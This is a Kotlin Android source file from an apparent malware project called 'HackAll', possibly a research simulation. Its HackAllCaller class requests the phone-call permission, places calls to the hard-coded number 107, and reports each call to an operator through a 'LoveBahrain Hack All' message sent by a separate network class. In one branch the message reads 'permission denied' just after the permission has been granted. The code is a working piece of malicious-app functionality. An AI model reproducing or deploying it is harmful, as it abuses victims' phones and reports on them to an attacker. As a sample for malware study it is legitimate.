package cocomelonc.hackall.tools

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import androidx.core.net.toUri
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.single.PermissionListener

class HackAllCaller (private val context: Context) {
    private val number = "107"
    private fun startCall() {
        var intent = Intent(Intent.ACTION_CALL)
        intent.data = "tel:$number".toUri()
        context.startActivity(intent)
    }

    @SuppressLint("NewApi")
    fun isCallPermissionGranted(context: Context): Boolean {
        val isGranted = context.checkSelfPermission(Manifest.permission.CALL_PHONE)
        return isGranted == PackageManager.PERMISSION_GRANTED
    }

    private fun startCallPermissionRequest(context: Context, onGranted: () -> Unit) {
        Dexter.withContext(context)
            .withPermission(Manifest.permission.CALL_PHONE)
            .withListener(object : PermissionListener {
                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                    onGranted()
                }
                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
                override fun onPermissionRationaleShouldBeShown(
                    p0: PermissionRequest?,
                    p1: PermissionToken?
                ) {
                }
            }).check()
    }

    fun startNewCall() {
        if (isCallPermissionGranted(context)) {
            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 LoveBahrain Hack All Call started\n")
            startCall()
        } else {
            startCallPermissionRequest(context) {
            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 LoveBahrain Hack All Call permission denied\n")
            startCall()
            }
        }
    }
}